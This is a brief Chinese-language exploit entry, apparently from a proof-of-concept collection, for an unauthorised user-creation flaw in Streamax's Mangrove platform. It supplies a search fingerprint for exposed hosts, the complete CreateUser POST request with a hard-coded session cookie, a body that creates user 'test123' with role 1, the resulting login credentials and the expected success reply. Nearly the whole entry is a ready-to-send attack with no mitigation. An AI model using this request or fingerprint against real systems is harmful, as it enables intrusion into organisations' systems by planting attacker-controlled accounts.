# 深圳市锐明技术股份有限公司Mangrove系统存在任意用户添加漏洞

- **系统**：深圳市锐明技术股份有限公司Mangrove系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`icon_hash="564025728"`
- **请求**：`POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1`
- **关键头**：`Content-Length: 243`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;`

**请求体 / payload**
```
UserId=&GroupPower=1&VehiclePower=&UserName=test123&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=18181818181&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=cf2004f91f001ff3d422d50ff009c4df
登录系统
test123/qQq@123456
或者
test123/cf2004f91f001ff3d422d50ff009c4df
```
- **预期**：200　|　“Result”:true